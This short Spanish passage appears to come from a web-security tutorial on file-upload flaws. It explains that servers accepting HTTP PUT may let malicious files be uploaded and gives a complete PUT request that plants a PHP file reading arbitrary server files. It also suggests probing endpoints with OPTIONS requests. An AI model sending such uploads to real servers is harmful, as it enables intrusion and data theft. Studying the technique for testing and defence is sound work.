Vale la pena señalar que algunos servidores web pueden estar configurados para admitir `PUT` solicitudes. Si no existen defensas adecuadas, esto puede proporcionar un medio alternativo para cargar archivos maliciosos, incluso cuando una función de carga no está disponible a través de la interfaz web.

```
PUT /images/exploit.php HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-httpd-php 
Content-Length: 49 

<?php echo file_get_contents('/path/to/file'); ?>
```

#### TIP

Puedes intentar enviar `OPTIONS` solicitudes a diferentes puntos finales para probar cualquiera que anuncie soporte para el `PUT` método.
